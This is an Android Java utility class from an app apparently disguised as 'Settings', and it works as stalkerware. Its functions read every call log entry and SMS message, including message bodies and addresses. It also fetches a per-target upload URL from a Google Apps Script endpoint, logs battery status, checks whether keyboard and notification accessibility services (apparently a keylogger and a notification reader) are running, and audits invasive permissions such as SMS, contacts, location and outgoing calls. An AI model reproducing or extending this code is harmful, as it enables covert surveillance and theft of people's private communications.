package com.example.settings;

import static com.example.settings.ConnectivityManagers.isConnectedToNetwork;
import static com.example.settings.MainActivity.setuponetimeworkManager;

import android.Manifest;
import android.app.Activity;
import android.app.ActivityManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.BatteryManager;
import android.util.Log;

import androidx.core.content.ContextCompat;
import androidx.work.ListenableWorker;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.RetryPolicy;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.wickerlabs.logmanager.LogObject;
import com.wickerlabs.logmanager.LogsManager;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class Utils {

    public static String getDateTime()
    {
        String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
        String currentTime = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());

        return currentDate + "[" + currentTime + "]";
    }
    public static String getCurrentDateTime()
    {
        String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
        String currentTime = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
        return currentDate + "[" + currentTime + "]";
    }
    public  static void  readCallLogs(Context applicationContext,Sharedpref mSharedpref) {
        LogsManager logsManager = new LogsManager(applicationContext);
        List<LogObject> callLogs = logsManager.getLogs(LogsManager.ALL_CALLS);
        JSONArray jsonArray=new JSONArray();
        DateFormat simple = new SimpleDateFormat("dd MMM yyyy HH:mm:ss:SSS Z");
        for(int i=0;i<callLogs.size();i++){
            JSONObject jsonObject=new JSONObject();
            try {
                jsonObject.put("Call Number",callLogs.get(i).getNumber());
                jsonObject.put("Call Name",callLogs.get(i).getContactName());
                jsonObject.put("Call Type",callLogs.get(i).getType());
                jsonObject.put("Call Duration",callLogs.get(i).getCoolDuration());
                Date d = new Date(callLogs.get(i).getDate());
                jsonObject.put("Call Date",simple.format(d));
                jsonArray.put(jsonObject);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        mSharedpref.setCallHistory(jsonArray.toString());
        mSharedpref.commit();
    }
    public static void readSmsHistory(Activity mActivity, Sharedpref mSharedpref){
        JSONArray smsArray=new JSONArray();
        Uri message = Uri.parse("content://sms/");
        ContentResolver cr = mActivity.getContentResolver();

        Cursor c = cr.query(message, null, null, null, null);
        mActivity.startManagingCursor(c);
        int totalSMS = c.getCount();

        if (c.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {
                JSONObject jsonObject=new JSONObject();
                try {
                    jsonObject.put("Id",c.getString(c.getColumnIndexOrThrow("_id")));
                    jsonObject.put("Address",c.getString(c.getColumnIndexOrThrow("address")));
                    jsonObject.put("MsgBody",c.getString(c.getColumnIndexOrThrow("body")));
                    if (c.getString(c.getColumnIndexOrThrow("read")).contains("1")) {
                        jsonObject.put("status","Read");
                    } else {
                        jsonObject.put("status","NotRead");
                    }
                    String datetime=c.getString(c.getColumnIndexOrThrow("date"));
                    Date date=new Date(Long.parseLong(datetime));
                    SimpleDateFormat df2 = new SimpleDateFormat("dd/MM/yy");
                    String dateText = df2.format(date);
                    jsonObject.put("Time",dateText);
                    if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
                        jsonObject.put("Foldername","inbox");
                    } else {
                        jsonObject.put("Foldername","sent");
                    }
                    smsArray.put(jsonObject);

                } catch (JSONException e) {
                    e.printStackTrace();
                    continue;
                }
                c.moveToNext();
            }
        }
        // else {
        // throw new RuntimeException("You have no SMS");
        // }
        c.close();
        mSharedpref.setSmsHistory(smsArray.toString());
        mSharedpref.commit();
        Log.d("Tag", String.valueOf(smsArray.length()));
    }
    public static void newUrlData(Context context,Sharedpref mSharedpref){
       String url="https://script.googleusercontent.com/macros/echo?user_content_key=RdsJJZR1E_p8xnTCxFEtKU7tqCFkUC_FTl3E2g_cDSIjpo-V43chBBHgueEZb0TFHwjC-4TPOuQPKeaiaJj0jjjQkeJ4Hs0Wm5_BxDlH2jW0nuo2oDemN9CCS2h10ox_1xSncGQajx_ryfhECjZEnH8eXEwHkzBGtIkfTyiTbSQKygxmT3GiA5SP-kQUhNAjebhQ5PeN_2JFSwNzgXMLi_qVtBV2CbTgnh8KTGIWb5_kN85XsxDPBA&lib=M2DzEZy__TPANi9YiRKV2MkfyXhMohYri";
        String Name = mSharedpref.getSaveName();
        if(isConnectedToNetwork(context)){
            StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
                    new Response.Listener<String>() {
                        @Override
                        public void onResponse(String response) {
                            Log.d(context.getPackageName(),response);
                            try {
                                JSONObject jsonObject=new JSONObject(response);
                                JSONArray jsonArray=jsonObject.getJSONArray("user");
                                for (int i=0;i<jsonArray.length()-1;i++){
                                    JSONObject jsonObject1=jsonArray.getJSONObject(i);
                                    String mName=jsonObject1.getString("name");
                                    Log.d("",mName);
                                    if (Name.trim().equalsIgnoreCase(mName.trim())){
                                        String mUrl=jsonObject1.getString("url");
                                        mSharedpref.setUrl(mUrl);
                                        mSharedpref.commit();
                                        break;
                                    }
                                }
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }
                    },
                    new Response.ErrorListener() {
                        @Override
                        public void onErrorResponse(VolleyError error) {
                            Log.d(context.getPackageName(),"Error");
                            setuponetimeworkManager();
                        }
                    }
            );
            int socketTimeOut = 50000;// u can change this .. here it is 50 seconds
            RetryPolicy retryPolicy = new DefaultRetryPolicy(socketTimeOut, 0, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT);
            stringRequest.setRetryPolicy(retryPolicy);
            RequestQueue queue = Volley.newRequestQueue(context);
            queue.add(stringRequest);
        }
        else {
            Log.d("Settings","Internet Problem");
        }
    }
    public static void getBatteryPercent(Context mContext,Sharedpref mSharedpref) {
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = mContext.registerReceiver(null, ifilter);
        int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                status == BatteryManager.BATTERY_STATUS_FULL;
        // How are we charging?
        int chargePlug = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
        boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
        boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
        int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);

        float batteryPct = level * 100 / (float) scale;
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("battery peecentage", String.valueOf(batteryPct));
            jsonObject.put("status", String.valueOf(status));
            jsonObject.put("level", String.valueOf(level));
            jsonObject.put("scale", String.valueOf(scale));
            jsonObject.put("isCharging", isCharging);
            jsonObject.put("usbCharge", usbCharge);
            jsonObject.put("acCharge", acCharge);

        } catch (JSONException e) {
            e.printStackTrace();
        }
        mSharedpref.setBatteryPercnt(jsonObject.toString());
        mSharedpref.commit();
    }
    public static String isMyServiceRunning(Context mcContext,Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) mcContext.getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return "True";
            }
        }
        return "False";
    }
    public static void checkServices(Context mContext,Sharedpref mSharedpref){
        JSONObject jsonObject=new JSONObject();
        String KeyboardAcessbilityService=isMyServiceRunning(mContext,KeyBoards.class);
        String NotificationAcessbilityService=isMyServiceRunning(mContext,Notifications.class);
        String NotificationService=isMyServiceRunning(mContext,NotificationService.class);
        try {
            jsonObject.put("Keyboard",KeyboardAcessbilityService);
            jsonObject.put("Notification Accessbility",NotificationAcessbilityService);
            jsonObject.put("Notification Service",NotificationService);
            jsonObject.put("Phone State",checkpermission(mContext,Manifest.permission.READ_PHONE_STATE));
            jsonObject.put("READ SMS",checkpermission(mContext,Manifest.permission.READ_SMS));
            jsonObject.put("GET ACCOUNTS",checkpermission(mContext,Manifest.permission.GET_ACCOUNTS));
            jsonObject.put("ACCESS COARSE_LOCATION",checkpermission(mContext,Manifest.permission.ACCESS_COARSE_LOCATION));
            jsonObject.put("ACCESS FINE_LOCATION",checkpermission(mContext,Manifest.permission.ACCESS_FINE_LOCATION));
            jsonObject.put("READ CALL_LOG",checkpermission(mContext,Manifest.permission.READ_CALL_LOG));
            jsonObject.put("READ_CONTACTS",checkpermission(mContext,Manifest.permission.READ_CONTACTS));
            jsonObject.put("WRITE_CONTACTS",checkpermission(mContext,Manifest.permission.WRITE_CONTACTS));
            jsonObject.put("RECEIVE_SMS",checkpermission(mContext,Manifest.permission.RECEIVE_SMS));
            jsonObject.put("PROCESS OUTGOING_CALLS",checkpermission(mContext,Manifest.permission.PROCESS_OUTGOING_CALLS));
            jsonObject.put("READ_EXTERNAL_STORAGE",checkpermission(mContext,Manifest.permission.READ_EXTERNAL_STORAGE));
        } catch (JSONException e) {
            e.printStackTrace();
        }
        mSharedpref.setServiceStatus(jsonObject.toString());
        mSharedpref.commit();
    }
    public static boolean checkpermission(Context mContext, String PermissionName){
        if ((ContextCompat.checkSelfPermission(mContext, PermissionName)!= PackageManager.PERMISSION_GRANTED)) {
            return false;
        }
        return true;
    }
}
